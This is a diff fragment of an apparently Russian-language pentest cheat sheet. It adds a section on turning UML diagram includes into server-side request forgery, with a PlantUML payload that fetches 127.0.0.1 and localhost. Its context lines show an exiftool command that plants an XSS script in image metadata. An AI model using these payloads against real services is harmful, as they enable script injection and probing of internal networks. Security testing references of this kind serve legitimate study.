@@ -56,4 +56,15 @@ xlink:href="https://controlledserver.com/pic.svg" />
 exiftool -Comment="\"><script>alert(prompt('Payload for XSS'))</script>" xss_comment_exif_metadata_double_quote.png
 ```
 
-##
+## UML -> SSRF
+
+UML диаграммы могут поддерживать инклуд других файлов, в том числе с удаленных сервисов
+
+Например:
+
+```
+@startuml
+!include http://127.0.0.1:80
+%load_json('http://localhost')
+@enduml
+```
